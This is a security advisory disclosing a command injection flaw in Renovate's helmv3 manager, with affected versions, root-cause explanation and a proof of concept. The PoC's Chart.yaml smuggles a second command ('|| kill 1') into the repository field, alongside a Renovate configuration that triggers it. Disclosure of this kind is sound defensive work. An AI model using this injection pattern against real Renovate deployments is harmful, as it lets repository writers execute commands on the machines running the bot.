# [M] Renovate vulnerable to arbitrary command injection via helmv3 manager and malicious Chart.yaml file

## Summary
Severity: Medium
Advisory: GHSA-3f44-xw83-3pmg
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-3f44-xw83-3pmg
Type: github-advisory

## Affected
- npm: `renovate` — affected >=31.51.0 <40.33.0

## Details
### Summary
The user-provided string `repository` in the `helmv3` manager is appended to the `helm registry login` command without proper sanitization.

### Details
Adversaries can provide a maliciously crafted `Chart.yaml` in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.
The value for both uses of the `repository` variable in [lib/modules/manager/helmv3/common.ts](https://github.com/renovatebot/renovate/blob/b69416ce1745f67c9fc1d149738e2f52feb4f732/lib/modules/manager/helmv3/common.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 31.51.0 (https://github.com/renovatebot/renovate/commit/f372a68144a4d78c9f7f418168e4efe03336a432), released on January 24 of 2022.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"99999.0.0"}]}'],
    },
  },
  // Register any credentials to make the manager attempt to use basic auth for the Helm registry
  hostRules: [
    {
      matchHost: "charts.bitnami.com",
      username: "un",
      password: "pw",
    },
  ],
  packageRules: [
    {
      // Target of the day
      matchManagers: ["helmv3"],
      // Don't consult the actual bitnami repo
      registryUrls: [],
      // But still, trick the manager in believing there's a new version
      overrideDatasource: "custom.always",
    },
  ],
}

```


`Chart.yaml`:

```yaml
apiVersion: v2
name: renovate-aci-1
version: 0.0.1
dependencies:
  - name: redis
    version: 0.1.0
    repository: oci://charts.bitnami.com/bitnami || kill 1

```


`Chart.lock`:

```yaml
dependencies:
- name: redis
  repository: oci://charts.bitnami.com/bitnami
```

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

> [!NOTE]
> This specific proof of concept was made a lot simpler with the introduction of the `overrideDatasource` configuration since version 38.120.0 (https://github.com/renovatebot/renovate/commit/a70a6a376d31148e80be5a5c885ac33ff5ddb30c), released on October 12 of 2024, because it means that there is no more need for a proper response from an actual Helm registry on the malformed repository URL.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

## References
- https://github.com/renovatebot/renovate/security/advisories/GHSA-3f44-xw83-3pmg
- https://github.com/renovatebot/renovate
